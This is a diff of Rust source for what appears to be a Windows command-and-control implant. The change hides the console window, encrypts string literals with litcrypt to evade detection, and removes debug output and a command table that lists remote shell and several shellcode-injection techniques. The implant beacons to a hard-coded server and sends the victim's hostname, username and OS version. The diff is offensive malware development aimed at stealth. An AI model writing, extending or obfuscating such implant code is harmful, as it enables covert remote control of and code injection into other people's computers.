@@ -1,29 +1,15 @@
 #![windows_subsystem = "windows"]
+// For requests, alwaus blocking never async
 use reqwest::blocking::ClientBuilder;
+
+use litcrypt::{use_litcrypt, lc};
+use_litcrypt!();
 
 mod commands;
 mod obfwin;
 
-// Globals
-
 // Sleep time in seconds
 const SLEEP_TIME: u64 = 10;
-
-// Const for checking incoming commands against
-const COMMANDS_LUT: [&str; 5] = [
-    "CMD_SHELL",
-    "CMD_SHELLCODE_INJECT",
-    "CMD_SHELLCODE_SPAWN",
-    "CMD_SHELLCODE_EARLYBIRD",
-    "CMD_KILL",
-];
-
-// Const for checking incoming commands to get files or not
-const FILE_COMMANDS_LUT: [&str; 3] = [
-    "CMD_SHELLCODE_INJECT",
-    "CMD_SHELLCODE_SPAWN",
-    "CMD_SHELLCODE_EARLYBIRD",
-];
 
 fn login(
     base_url: &str,
@@ -179,15 +165,11 @@ fn main() {
     let major_v = versions.first().unwrap();
     let minor_v = versions.last().unwrap();
 
-    println!("Hostname: {}", hostname);
-    println!("Username: {}", username);
-    println!("OS: {}:{}", major_v, minor_v);
-
-    let base_url = "https://192.168.4.54";
+    let base_url = lc!("https://192.168.4.54");
 
     let resp = login(&*base_url, &*hostname, &*username, &*major_v, &*minor_v).unwrap();
 
-    let implant_id = resp.headers().get("cookie").unwrap().to_str().unwrap();
+    let implant_id = resp.headers().get(lc!("cookie")).unwrap().to_str().unwrap();
 
     let cookie_header = reqwest::header::HeaderValue::from_str(implant_id).unwrap();
 
